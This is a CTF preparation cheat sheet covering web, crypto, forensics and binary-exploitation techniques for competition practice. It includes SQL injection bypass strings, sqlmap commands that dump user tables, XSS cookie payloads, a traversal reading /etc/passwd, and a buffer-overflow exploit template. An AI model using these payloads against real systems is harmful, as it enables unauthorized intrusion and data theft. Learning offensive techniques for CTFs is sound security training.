# CTF PREPARATION PLAYBOOK & CHEAT SHEET (NOV 12)

A battle-tested reference guide for Capture The Flag (CTF) competitions covering Web, Crypto, Forensics, Reverse Engineering, and Binary Exploitation.

---

## 1. GENERAL CTF METHODOLOGY

1. **Information Gathering**: Scan ports, analyze source code, inspect headers, extract metadata.
2. **Identify Entry Points**: Find user inputs, login forms, file upload mechanisms, cookie parameters, or binary functions.
3. **Exploitation**: Craft payloads, write custom Python exploit scripts, utilize CLI tools.
4. **Post-Exploitation**: Escalate privileges, decode flags (`flag{...}` or `CTF{...}` format).

---

## 2. WEB EXPLOITATION

### Essential Tools
- **Burp Suite**: HTTP proxy for capturing, repeating, and fuzzing requests.
- **sqlmap**: Automated SQL injection tool.
- **ffuf / dirsearch**: Fast web directory bruteforcing.

### Common Vulnerabilities & Payloads

#### SQL Injection (SQLi)
- Authentication Bypass:
  ```sql
  ' OR 1=1--
  ' OR '1'='1
  admin' --
  ```
- Automated dump using `sqlmap`:
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
  sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
  sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
  ```

#### Cross-Site Scripting (XSS)
- Reflected/Stored XSS test payloads:
  ```html
  <script>alert(1)</script>
  <img src=x onerror=alert(document.cookie)>
  <svg onload=alert(1)>
  ```

#### Directory Traversal / LFI
```text
http://target.com/view?file=../../../../etc/passwd
http://target.com/view?file=php://filter/convert.base64-encode/resource=index.php
```

#### Directory Brute-Forcing
```bash
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

---

## 3. CRYPTOGRAPHY

### Essential Tools
- **CyberChef**: Web app for visual data transformation, decoding, and cipher analysis.
- **PyCryptodome / pwntools**: Python libraries for cryptographic operations.

### Common Ciphers & Fast Decodes
- **Base64**: Ends with `=` or `==`. `echo "cGGF..." | base64 -d`
- **Hex**: Sequences of 0-9, a-f. `echo "435446" | xxd -r -p`
- **ROT13 / Caesar**: Shift cipher (use CyberChef "ROT13" or "Amount shift").
- **XOR**: Repeating key XOR or single-byte XOR.

### Python XOR Solver Template
```python
def xor_decrypt(ciphertext, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(ciphertext)])

data = bytes.fromhex("1c0111001f010100")
key = b"CTF"
print(xor_decrypt(data, key))
```

### RSA Attack Vectors
- Small $e=3$: Take the $e$-th root of ciphertext.
- Factorizing $N$: If $N$ is small, use [factordb.com](https://factordb.com).
- RSA Python template:
  ```python
  from Crypto.Util.number import long_to_bytes
  import gmpy2

  c = 123456789...
  e = 3
  m, exact = gmpy2.iroot(c, e)
  if exact:
      print(long_to_bytes(m))
  ```

---

## 4. FORENSICS & STEGANOGRAPHY

### Essential Commands & Tools
- **strings**: Extract human-readable text from binary files.
  ```bash
  strings challenge.png | grep -i "flag"
  ```
- **exiftool**: Read file metadata.
  ```bash
  exiftool photo.jpg
  ```
- **binwalk**: Search and extract embedded files/archives inside images/binaries.
  ```bash
  binwalk -e flag_carrier.png
  ```
- **steghide**: Extract hidden text/data from JPEG/WAV files.
  ```bash
  steghide extract -sf image.jpg -p "passphrase"
  ```
- **zsteg**: Detect hidden data in PNG/BMP LSBs.
  ```bash
  zsteg -a image.png
  ```
- **Wireshark**: Inspect PCAP files. Search for HTTP POST requests, DNS queries, or TCP streams.

---

## 5. REVERSE ENGINEERING & BINARY EXPLOITATION (PWN)

### Essential Tools
- **Ghidra**: NSA disassembler & decompiler (GUI).
- **GDB + GEF / PEDA**: Terminal debugger for dynamic binary analysis.
- **pwntools**: Python library for exploit automation.

### Basic Workflow
1. Check binary safety checks:
   ```bash
   checksec --file=vulnerable_binary
   ```
2. Decompile using Ghidra or `objdump -d binary`.
3. Locate vulnerabilities like `gets()`, `strcpy()`, `sprintf()` (buffer overflows).

### Pwntools Exploit Boilerplate
```python
from pwn import *

# Context setting
context.binary = './vulnerable_binary'
p = process('./vulnerable_binary') # or remote('host', port)

# Craft payload
offset = 64
junk = b'A' * offset
target_addr = p64(0x4011d6) # Target function address

payload = junk + target_addr

p.sendlineafter(b'Input:', payload)
p.interactive()
```

---

## 6. ESSENTIAL LINUX COMMAND CHEAT SHEET

```bash
# Search file contents recursively for flag format
grep -rnw '/path/to/folder' -e 'flag{'

# Find files modified in the last 1 day
find / -mtime -1 2>/dev/null

# Connect to netcat CTF service
nc challenge.ctf.site 9000

# Base64 decode stream and save to file
echo "SGVsbG8=" | base64 -d > output.bin
```

---

## 7. HIGH-YIELD PRACTICE PLATFORMS
- **Linux Terminal**: [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
- **Web Security**: [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- **Cryptography**: [CryptoHack](https://cryptohack.org/)
- **All-Round CTF Practice**: [picoCTF](https://picoctf.org/)
